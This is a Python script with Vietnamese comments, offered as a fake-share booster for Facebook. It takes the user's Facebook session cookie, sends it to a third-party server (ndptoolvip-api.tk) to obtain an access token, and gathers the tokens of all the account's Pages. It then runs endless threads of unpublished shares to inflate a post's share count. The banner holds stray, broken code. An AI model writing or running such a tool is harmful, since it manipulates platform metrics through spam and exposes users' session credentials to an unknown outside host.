import requests,random,threading,os
list_token = []
# =========================== [ CLASS + FUNCTION TOOL ] ===========================
def banner():
    # Nhận Code Tool Theo Yêu Cầu (Trong Khả Năng) 
    # Zalo: 039822341x - Trần Đức Thắng 
    # Tele: @Tranducthang - Trần Đức Thắng
    os.system("cls" if os.name == "nt" else "clear")
    os.system('title TOOL SHARE ẢO MAX SPEED - Tranducthang209')
    banner = '''
          Copyright © DucThang-Tool 2023 | Phiên Bản: 1.0
        
████████╗██████╗░░█████╗░███╗░░██╗  ██████╗░██╗░░░██╗░█████╗░  ████████╗██╗░░██╗░█████╗░███╗░░██╗░██████╗░
╚══██╔══╝██╔══██╗██╔══██╗████╗░██║  ██╔══██╗██║░░░██║██╔══██╗  ╚══██╔══╝██║░░██║██╔══██╗████╗░██║██╔════╝░
░░░██║░░░██████╔╝███████║██╔██╗██║  ██║░░██║██║░░░██║██║░░╚═╝  ░░░██║░░░███████║███████║██╔██╗██║██║░░██╗░
░░░██║░░░██╔══██╗██╔══██║██║╚████║  ██║░░██║██║░░░██║██║░░██╗  ░░░██║░░░██╔══██║██╔══██║██║╚████║██║░░╚██╗
░░░██║░░░██║░░██║██║░░██║██║░╚███║  ██████╔╝╚██████╔╝╚█████╔╝  ░░░██║░░░██║░░██║██║░░██║██║░╚███║╚██████╔╝
░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝  ╚═════╝░░╚═════╝░░╚════╝░  ░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝░╚═════╝░  
    [  COPYRIGHT LICENSE: TRANDUCTHANG       ]
    [  TRAN DUC THANG - ZALO: 0396735565     ]
    [  FB: https://www.facebook.com/dthangg.developer.xyz/     ]              
    [  TOOL SHARE ẢO MAX SPEED - VERSION 1.0  ]
  import time;
  localtime = time.asctime( time.localtime(time.time()) )
  print "Thoi gian da duoc dinh dang la :", localtime
    '''
    print(banner)
class TranDucThangCuteVcl:
    def gettoken(self, cookie):
        # Nhận Code Tool Theo Yêu Cầu (Trong Khả Năng) 
        # Zalo: 0396735565 - TRAN DUC THANG 
        # Tele: @tranducthang - Trần Đức Thắng
        json_info = requests.get('https://ndptoolvip-api.tk/api/gettokeneaabw.php?cookie='+cookie).json()
        if json_info['status'] == 'success':
            return json_info
        else:
            return False
    def getpage(self, token):
        # Nhận Code Tool Theo Yêu Cầu (Trong Khả Năng) 
        # Zalo: 0396735565 - Trần Đức Thắng
        # Tele: @tranducthang - Trần Đức Thắng
        try:
            json_get = requests.get('https://graph.facebook.com/me/accounts?access_token='+token).json()['data']
            if len(json_get) != 0:
                return json_get
            else: 
                return False
        except:
            return False
    def run_share(self, tokenpage, id_post):
        # Nhận Code Tool Theo Yêu Cầu (Trong Khả Năng) 
        # Zalo: 0396735565 - Trần Đức Thắng 
        # Tele: @tranducthang - Trần Đức Thắng
        rq_url = random.choice([requests.get, requests.post])
        sharepost = rq_url(f'https://graph.facebook.com/me/feed?method=POST&link=https://m.facebook.com/{id_post}&published=0&access_token={tokenpage}').json()
        if 'id' in sharepost:
            idshare = sharepost['id']
            print(f'[NĐP] | [UID SHARE: {idshare}] | TRẠNG THÁI: THÀNH CÔNG! ')
        else:
            print('[NĐP] | TRẠNG THÁI: LỖI?')
# =========================== [ BẮT ĐẦU CHẠY TOOL ] ===========================
banner()
while True:
    cookie = input('VUI LÒNG NHẬP COOKIE FACEBOOK CHỨA PAGE: ')
    dpcute = TranDucThangCuteVcl()
    checklive = dpcute.gettoken(cookie)
    if checklive != False:
        token = checklive['access_token']
        name  = checklive['name']
        uid   = checklive['id']
        print('─'*50)
        print(f'NAME FB: {name} | UID FB: {uid}')
        print('─'*50)
        break
    else:
        print('Cookie Die Or Out Vui Lòng Nhập Lại!!')
        continue
id_post = input('UID POST: ')
print('─'*50)
luong = int(input('VUI LÒNG NHẬP SỐ LUỒNG SHARE: '))
print('─'*50)
getpage = dpcute.getpage(token)
if getpage != False:
    print(f'Đã Tìm Thấy | {len(getpage)} | Page', end='\r')
    for getdl in getpage:
        tokenpagegett = getdl['access_token']
        list_token.append(tokenpagegett)
else:
    print('Không Tìm Thấy Page Nào!!')
while True:
    for tokenpage in list_token:
        t = threading.Thread(target=dpcute.run_share,args=(tokenpage, id_post))
        t.start()
        while threading.active_count() > luong:
            t.join()